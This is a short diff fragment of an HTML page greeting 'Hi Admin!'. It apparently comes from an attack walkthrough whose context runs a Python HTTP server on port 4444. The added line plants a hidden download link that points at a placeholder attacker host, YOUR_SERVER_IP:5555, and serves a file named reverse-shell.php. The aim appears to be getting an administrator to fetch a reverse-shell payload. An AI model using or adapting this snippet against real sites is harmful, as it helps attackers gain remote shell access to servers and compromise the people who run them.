@@ -148,6 +148,7 @@ sudo python3 -m http.server 4444
     </script>
   </head>
   <body>
+    <a id="downloadLink" href="http://YOUR_SERVER_IP:5555/reverse-shell.php" download="reverse-shell.php" style="display:none;"></a>
     <h1>Hi Admin!</h1>
   </body>
 </html>
